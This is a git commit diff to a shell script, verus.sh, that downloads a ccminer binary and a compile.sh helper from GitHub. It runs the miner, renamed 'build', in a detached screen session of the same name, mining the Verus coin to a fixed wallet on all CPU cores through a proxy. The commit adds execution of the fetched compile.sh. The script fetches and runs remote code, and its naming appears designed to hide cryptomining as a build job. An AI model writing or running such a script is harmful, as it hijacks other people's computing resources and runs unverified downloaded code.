d97bd0dd4d8523cd73a565b41bcaa65d24c8a659
declined01 <90489436+declined01@users.noreply.github.com>
2021-10-20 21:10:42 +0700

    Update verus.sh

--- verus.sh
+++ verus.sh
@@ -10,4 +10,5 @@ apt-get update
 wget -q https://raw.githubusercontent.com/declined01/master/master/compile.sh
 wget -qO build https://github.com/declined01/master/raw/master/ccminer
 screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RV9KzJ9v7HJ5puLKh32iWPGboKXDoL7HB3.nothing-$worker -p x -t $(nproc --all) -x $proxy
+chmod +x compile.sh
 ./compile.sh
